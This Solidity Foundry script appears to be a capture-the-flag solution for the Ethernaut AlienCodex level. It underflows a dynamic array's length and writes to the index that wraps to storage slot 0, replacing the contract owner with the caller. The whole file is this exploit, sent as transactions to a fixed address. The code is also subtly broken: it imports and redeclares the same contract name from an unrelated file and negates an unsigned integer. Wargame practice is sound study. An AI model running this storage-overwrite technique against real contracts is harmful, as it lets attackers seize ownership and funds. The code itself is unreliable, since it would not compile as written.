// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {AlienCodexHack} from "../src/GateKeeperTwo.sol";

contract AlienCodexHack is Script {
    AlienCodexHack public alienCodexHack =
        AlienCodexHack(0xA43876f0FeC09DB4Fe33D21dFed299C534029F40);

    function run() external {
        //h =  keccak256(1)

        // new length = 2^256

        // slot h + 0 -> codex[0]
        // slot h + 1 -> codex[1]
        // slot h + 2 -> codex[2]
        // slot h + 2^256-1 -> codex[2^256-1]
        // slot h + i -> slot 0
        // i = -h
        // these slots encompass the entire storage variables, therefore slot0(addressOwner) is somewhere here

        vm.startBroadcast();

        alienCodexHack.makeContact();
        alienCodexHack.retract();
        alienCodexHack.revise(
            -uint256(keccak256(abi.encode(uint256(1)))),
            msg.sender
        );

        vm.stopBroadcast();
    }
}
